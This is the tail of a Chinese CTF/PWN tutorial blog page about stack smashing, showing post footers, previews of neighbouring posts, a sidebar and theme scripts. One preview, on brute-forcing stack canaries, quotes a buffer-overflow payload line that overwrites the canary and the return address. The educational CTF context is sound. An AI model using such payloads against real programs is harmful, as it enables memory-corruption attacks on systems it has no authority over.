+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://elydemiurge.github.io">Cyberangel</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-4-1%EF%BC%89-%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7-Stack%20smash/">https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-4-1%EF%BC%89-%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7-Stack%20smash/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://elydemiurge.github.io" target="_blank">Cyberangel's Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://picsum.photos/seed/blog-cover-06/800/450" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-1-3%EF%BC%89-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6%EF%BC%88x86%EF%BC%89/" title="PWN入门（2-1-3）-格式化字符串漏洞进阶（x86）"><img class="cover" src="https://picsum.photos/seed/blog-cover-02/800/450" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">PWN入门（2-1-3）-格式化字符串漏洞进阶（x86）</div></div><div class="info-2"><div class="info-item-1">PWN入门（2-1-3）-格式化字符串漏洞进阶（x86） 文章摘自：https://blog.csdn.net/qq_41202237&#x2F;article&#x2F;details&#x2F;107662273  我们补充一下上一节的内容： 格式化字符串函数介绍格式化字符串函数将第一个参数作为格式化字符串，根据其来解析之后的参数。一般来说格式化字符串在利用的时候主要分三个部分  格式化字符串函数 格式化字符串 后续参数  格式化字符串函数输入函数：scanf 输出函数：    函数 基本介绍    printf 输出到stdout   fprintf 输出到执行FILE流   vprintf 根据参数列表格式化输出到stdout   vfprintf 根据参数列表格式化输出到指定FILE流   sprintf 输出到字符串   snprintf 输出指定字节数到字符串   vsprintf 根据参数列表格式化输出到字符串   vsnprintf 根据参数列表格式化输出指定字节到字符串   setproctitle 设置argv   syslog 输出日志   err，ver...</div></div></div></a><a class="pagination-related" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E5%85%A5%E9%97%A8/PWN%E5%85%A5%E9%97%A8%EF%BC%882-3-1%EF%BC%89-%E7%88%86%E7%A0%B4Canary/" title="PWN入门（2-3-1）-爆破Canary"><img class="cover" src="https://picsum.photos/seed/blog-cover-01/800/450" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">PWN入门（2-3-1）-爆破Canary</div></div><div class="info-2"><div class="info-item-1">PWN入门（2-3-1）-爆破Canary 参考资料：https://blog.csdn.net/AcSuccess/article/details/104119680附件下载：链接：https://pan.baidu.com/s/1Xixholq_JWSTJQQuHxYNcA提取码：xauv  此篇文章的更新与补充 更新时间：2023年10月06日，感谢@鸡鸭**师傅提出的问题。**  有师傅在此篇文章的评论区问道“exp中canary后面为什么要跟12字节垃圾数据呢？”：  我看了一眼最后的payload：payload = &#39;A&#39; * 100 + canary + &#39;A&#39; * 12 + p32(addr)，唉↗，对哦，为什么呢？在我印象里canary不应该是和ebp相邻的吗？如下所示： 1234...（一些栈帧里的数据）canary			// 假设canary的偏移为offset_0，则ebp				// offset_4return_addr 	// offset_8  然后我用gdb调试了一下程序，发现canary和ebp还真不是这样： ...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Cyberangel</div><div class="author-info-description">二进制安全</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">467</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ElyDemiurge"><i class="fab fa-github"></i><span>GitHub</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ElyDemiurge" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:elydemiurge@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">从语雀迁移博客到 Github</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN%E5%85%A5%E9%97%A8%EF%BC%882-4-1%EF%BC%89-%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E6%8A%80%E5%B7%A7-Stack-smash"><span class="toc-number">1.</span> <span class="toc-text">PWN入门（2-4-1）-花式栈溢出技巧-Stack smash</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.2.</span> <span class="toc-text">示例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.1.</span> <span class="toc-text">基本思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEargv-0-%E6%8C%87%E9%92%88%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.2.2.</span> <span class="toc-text">寻找argv[0]指针位置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E8%BE%93%E5%85%A5%E6%97%B6%E7%9A%84%E6%A0%88%E9%A1%B6%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.2.3.</span> <span class="toc-text">寻找输入时的栈顶位置</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(11)--IoT%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83docker%E5%B0%81%E8%A3%85%E6%8C%87%E5%8D%97/" title="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南"><img src="https://picsum.photos/seed/blog-cover-06/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(11)--IoT%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83docker%E5%B0%81%E8%A3%85%E6%8C%87%E5%8D%97/" title="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南">《IoT从入门到入土》(11)--IoT靶场环境docker封装指南</a><time datetime="2022-12-08T00:19:26.000Z" title="发表于 2022-12-08 08:19:26">2022-12-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/" title="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）"><img src="https://picsum.photos/seed/blog-cover-07/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/" title="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）">《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）</a><time datetime="2022-11-25T01:47:22.000Z" title="发表于 2022-11-25 09:47:22">2022-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-1)--Zyxel-NAS%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建"><img src="https://picsum.photos/seed/blog-cover-08/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-1)--Zyxel-NAS%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建">《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建</a><time datetime="2022-11-21T02:38:00.000Z" title="发表于 2022-11-21 10:38:00">2022-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(9)--TOTOLINK_NR1800X%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8Alighttpd%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%B5%85%E6%9E%90/" title="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析"><img src="https://picsum.photos/seed/blog-cover-01/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(9)--TOTOLINK_NR1800X%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8Alighttpd%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%B5%85%E6%9E%90/" title="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析">《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析</a><time datetime="2022-11-10T05:43:27.000Z" title="发表于 2022-11-10 13:43:27">2022-11-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/Reverse/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%95%B4%E7%90%86%EF%BC%882020%E5%B9%B42%E6%9C%8823%E6%97%A5notability%E6%89%8B%E5%86%99%E7%AC%94%E8%AE%B0%EF%BC%89/" title="PE文件格式整理（2020年2月23日notability手写笔记）"><img src="https://picsum.photos/seed/blog-cover-02/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PE文件格式整理（2020年2月23日notability手写笔记）"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/Reverse/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%95%B4%E7%90%86%EF%BC%882020%E5%B9%B42%E6%9C%8823%E6%97%A5notability%E6%89%8B%E5%86%99%E7%AC%94%E8%AE%B0%EF%BC%89/" title="PE文件格式整理（2020年2月23日notability手写笔记）">PE文件格式整理（2020年2月23日notability手写笔记）</a><time datetime="2022-11-08T01:10:26.000Z" title="发表于 2022-11-08 09:10:26">2022-11-08</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2019 - 2026 By Cyberangel</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5"></script><script src="/js/main.js?v=5.5.5"></script><div class="js-pjax"></div><script src="/js/decode-copyright-url.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js" defer="defer"></script><script>document.addEventListener('DOMContentLoaded', () => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      true
+        ? pjax.loadUrl('/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.5"></script></div></div></body></html>
